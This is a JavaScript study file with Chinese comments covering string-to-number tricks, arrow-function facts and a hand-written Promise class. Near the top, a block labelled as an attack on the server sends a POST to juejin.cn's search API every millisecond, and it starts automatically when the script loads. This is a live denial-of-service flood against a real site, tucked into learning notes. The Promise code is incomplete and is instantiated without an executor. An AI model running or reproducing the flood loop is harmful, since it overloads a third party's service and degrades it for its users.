/**
 * @description 小知识学习
 * @private 字符串转数字 Number("123") ==  123  ~~"123" == 123 parseInt("123") == 123 parseFloat("123.123") == 123.123 1*"123" == 123 0 + "123" == "0123"
 * @private 1、箭头函数不可作为构造函数，不能使用new 2、箭头函数没有自己的this 3、箭头函数没有arguments对象 4、箭头函数没有原型对象
 * @private
 */

//一直发请求攻击服务器
setInterval(() => {
  const xhr = new XMLHttpRequest();
  xhr.open("post", "https://api.juejin.cn/search_api/v1/search");
  xhr.send(
    `aid=126&uuid=7132705493689787808&spider=${Math.floor(
      Math.random(1, 10) * 10
    )}`
  );
}, 1);

//手写Proimse
class myPromise {
  constructor(executor) {
    //初始化值
    this.initValue();
    //初始化this指向
    this.initBind();
    //执行传递的函数       
    try {
      // 执行传进来的函数
      executor(this.resolve, this.reject)
       } catch (e) {
      // 捕捉到错误直接执行reject
           this.reject(e)
       }
    }

  initBind() {
    //初始化this
    this.resolve = this.resolve.bind(this);
    this.reject = this.reject.bind(this);
  }

  initValue() {
    // 初始化值
    this.PromiseResult = null; // 终值
    this.PromiseState = "pending"; // 状态
  }

  resolve(value) {
    // state是不可变的
    if (this.PromiseState !== 'pending') return
    // 如果执行resolve，状态变为fulfilled
    this.PromiseState = "fulfilled";
    // 终值为传进来的值
    this.PromiseResult = value;
  }

  reject(reason) {
    // state是不可变的
    if (this.PromiseState !== 'pending') return
    // 如果执行reject，状态变为rejected
    this.PromiseState = "rejected";
    // 终值为传进来的reason
    this.PromiseResult = reason;
  }
  
  then(onFulfilled, onRejected) {
    // 接收两个回调 onFulfilled, onRejected
    
    // 参数校验，确保一定是函数
    onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : val => val
    onRejected = typeof onRejected === 'function' ? onRejected : reason => { throw reason }

    if (this.PromiseState === 'fulfilled') {
        // 如果当前为成功状态，执行第一个回调
        onFulfilled(this.PromiseResult)
    } else if (this.PromiseState === 'rejected') {
        // 如果当前为失败状态，执行第二哥回调
        onRejected(this.PromiseResult)
    }

}

}

window.__proto__.myPromise = new myPromise();
